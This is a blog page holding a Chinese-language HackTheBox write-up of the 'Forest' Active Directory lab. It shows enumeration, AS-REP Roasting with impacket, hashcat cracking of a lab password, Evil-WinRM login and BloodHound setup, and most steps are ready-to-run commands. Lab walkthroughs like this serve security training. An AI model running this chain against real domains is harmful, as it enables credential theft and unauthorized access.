@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Forest - T0x1c</title>
+
+  
+    <meta name="description" content="Forest是一个简单的靶机，知识点涉及RPC、AS-REP Roasting、WinRM登陆、BloodHound信息收集、DCSync等。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Forest">
+<meta property="og:url" content="https://toxic80l.github.io/post/8214c5fd/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Forest是一个简单的靶机，知识点涉及RPC、AS-REP Roasting、WinRM登陆、BloodHound信息收集、DCSync等。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-11%20%E4%B8%8A%E5%8D%8810.49.53.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0370.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/Forest.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-11%20%E4%B8%8B%E5%8D%883.54.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8B%E5%8D%8810.27.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8B%E5%8D%8811.30.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8B%E5%8D%8811.32.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-13%20%E4%B8%8A%E5%8D%8812.48.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-13%20%E4%B8%8A%E5%8D%882.27.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-13%20%E4%B8%8A%E5%8D%882.31.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8A%E5%8D%8811.22.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%8812.31.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%8812.32.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%882.37.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%883.42.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%883.39.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%884.17.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%883.56.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%884.05.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%884.35.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%882.25.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%882.37.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%882.30.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%882.49.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.01.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.51.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.57.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.28.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.27.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.29.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.33.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.37.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%884.39.34.png">
+<meta property="article:published_time" content="2022-03-15T08:40:47.000Z">
+<meta property="article:modified_time" content="2022-03-16T02:39:07.621Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="DCSync">
+<meta property="article:tag" content="RPC">
+<meta property="article:tag" content="AS-REP Roasting">
+<meta property="article:tag" content="WinRM">
+<meta property="article:tag" content="BloodHound">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-11%20%E4%B8%8A%E5%8D%8810.49.53.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#53%E7%AB%AF%E5%8F%A3"><span class="toc-text">53端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#445%E7%AB%AF%E5%8F%A3"><span class="toc-text">445端口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-svc-alfresco"><span class="toc-text">0x02 上线[svc-alfresco]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-text">AS-REP Roasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM%E7%99%BB%E9%99%86"><span class="toc-text">WinRM登陆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-administrator"><span class="toc-text">0x03 权限提升[administrator]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE"><span class="toc-text">信息枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%85%A5Exchange-Windows%E7%BB%84"><span class="toc-text">加入Exchange Windows组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCSync"><span class="toc-text">DCSync</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E9%99%86"><span class="toc-text">管理员登陆</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-03-15T08:40:47.000Z">2022-03-15</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Forest</span></h1>
+<p>Forest是一个简单的靶机，知识点涉及RPC、AS-REP Roasting、WinRM登陆、BloodHound信息收集、DCSync等。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-11%20%E4%B8%8A%E5%8D%8810.49.53.png" alt="截屏2022-03-11 上午10.49.53"></p>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0370.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span><u>通关思维导图</u>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/Forest.png" alt="Forest"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先使用 nmap 进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.161 -oA nmap_Forest</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-11%20%E4%B8%8B%E5%8D%883.54.36.png" alt="截屏2022-03-11 下午3.54.36"><br>扫描结果显示目标开放了53、88、135、445、5985等端口</p>
+<h4 id="53端口"><a href="#53端口" class="headerlink" title="53端口"></a>53端口</h4><p>在本地<code>hosts</code>文件中进行DNS解析域名<code>htb.local</code>、<code>forest.htb.local</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"><span class="comment">## 配置</span></span><br><span class="line">10.10.10.161 htb.local</span><br><span class="line">10.10.10.161 forest.htb.local</span><br></pre></td></tr></table></figure>
+<p>尝试进行区域传输</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @10.10.10.161 htb.local</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8B%E5%8D%8810.27.27.png" alt="截屏2022-03-12 下午10.27.27"></p>
+<h4 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h4><p>使用 smbmap 查看 smb 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.161</span><br><span class="line">smbmap -H 10.10.10.161 -u mac -p mac</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8B%E5%8D%8811.30.57.png" alt="截屏2022-03-12 下午11.30.57"><br>没有发现共享目录，使用 smbclient 进行探测也无法列出共享</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L //10.10.10.161</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8B%E5%8D%8811.32.19.png" alt="截屏2022-03-12 下午11.32.19"></p>
+<p>RPC远程过程调用枚举用户，成功拿到用户列表、用户组</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N 10.10.10.161</span><br><span class="line">rpcclient &gt; enumdomusers</span><br><span class="line">rpcclient &gt; enumdomgroups</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-13%20%E4%B8%8A%E5%8D%8812.48.57.png" alt="截屏2022-03-13 上午12.48.57"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-13%20%E4%B8%8A%E5%8D%882.27.49.png" alt="截屏2022-03-13 上午2.27.49"><br>查询域管理员组以及对应的管理员用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpcclient &gt; querygroup 0x200</span><br><span class="line">rpcclient &gt; querygroupmem 0x200</span><br><span class="line">rpcclient &gt; queryuser 0x1f4</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-13%20%E4%B8%8A%E5%8D%882.31.28.png" alt="截屏2022-03-13 上午2.31.28"></p>
+<h2 id="0x02-上线-svc-alfresco"><a href="#0x02-上线-svc-alfresco" class="headerlink" title="0x02 上线[svc-alfresco]"></a>0x02 上线[svc-alfresco]</h2><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>AS-REP Roasting是一种针对kerberos协议的攻击技术，在之前我们也讲到过 kerberoasting。那它们之间有什么区别呢？kerberoasting 通常需要域上的凭据才能进行身份验证，在域中提取服务帐户凭据哈希来进行离线破解。而 AS-REP Roasting 可提取账户哈希来进行离线暴力破解，前提是需要账户开启<code>不使用Kerberos预认证</code>或将<code>uf_dont_require_preauth</code>设置为true。</p>
+<p>正好在之前的检查中我们发现许多账户，对其进行过滤后拿到的用户列表如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Administrator</span></span><br><span class="line"><span class="string">andy</span></span><br><span class="line"><span class="string">lucinda</span></span><br><span class="line"><span class="string">mark</span></span><br><span class="line"><span class="string">santi</span></span><br><span class="line"><span class="string">sebastien</span></span><br><span class="line"><span class="string">svc-alfresco</span></span><br></pre></td></tr></table></figure>
+<p>使用 impacket 工具中的 GetNPUsers.py 尝试获取每个用户的哈希值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> $(cat user.txt);<span class="keyword">do</span> python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/<span class="variable">$&#123;user&#125;</span> | grep -v Impacket;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8A%E5%8D%8811.22.32.png" alt="截屏2022-03-14 上午11.22.32"><br>其中用户 svc-alfresco 存在哈希值，使用 hashcat 进行破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 svc-alfredsco.kerb /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%8812.31.09.png" alt="截屏2022-03-14 下午12.31.09"><br>成功破解密码为<code>s3rvice</code></p>
+<h3 id="WinRM登陆"><a href="#WinRM登陆" class="headerlink" title="WinRM登陆"></a>WinRM登陆</h3><p>使用 Evil-WinRM 借助该用户的凭据进行登陆<br><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm/releases/tag/v3.3">https://github.com/Hackplayers/evil-winrm/releases/tag/v3.3</a></strong><br>直接安装<code>gem install evil-winrm</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%8812.32.06.png" alt="截屏2022-03-14 下午12.32.06"><br>在当前用户的桌面查找flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\svc-alfresco\desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\svc-alfresco\desktop\user.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%882.37.15.png" alt="截屏2022-03-14 下午2.37.15"></p>
+<p>成功拿到第一个flag</p>
+<h2 id="0x03-权限提升-administrator"><a href="#0x03-权限提升-administrator" class="headerlink" title="0x03 权限提升[administrator]"></a>0x03 权限提升[administrator]</h2><h3 id="信息枚举"><a href="#信息枚举" class="headerlink" title="信息枚举"></a>信息枚举</h3><p>BloodHound 是一种单页的 JavaScript 的Web应用程序，能显示 Active Directory 环境中隐藏的和相关联的主机内容。攻击者常使用 BloodHound 识别高度复杂的攻击路径，防御者亦可借助其识别和防御相同的攻击路径。SharpHound 则可以帮助我们收集 BloodHound 的数据信息，在 BloodHound 中可直接夹在该数据</p>
+<p><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></strong><br><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1">https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1</a></strong></p>
+<p>安装 BloodHound</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install bloodhound</span><br></pre></td></tr></table></figure>
+<p>启动 neo4j</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j start</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%883.42.37.png" alt="截屏2022-03-14 下午3.42.37"><br>使用默认账号密码 neo4j/neo4j 进行登陆，首次登陆需要修改密码，修改后的密码为<code>mac.</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%883.39.02.png" alt="截屏2022-03-14 下午3.39.02"><br>密码修改完成后在终端启动 BloodHound</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8214c5fd/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%884.17.14.png" alt="截屏2022-03-14 下午4.17.14"><br>输入账号密码后登陆成功，然后在本地开启 http 服务用于传输<code>SharpHound.ps1</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+<p>将<code>SharpHound.ps1</code>加载至当前会话当中</p>
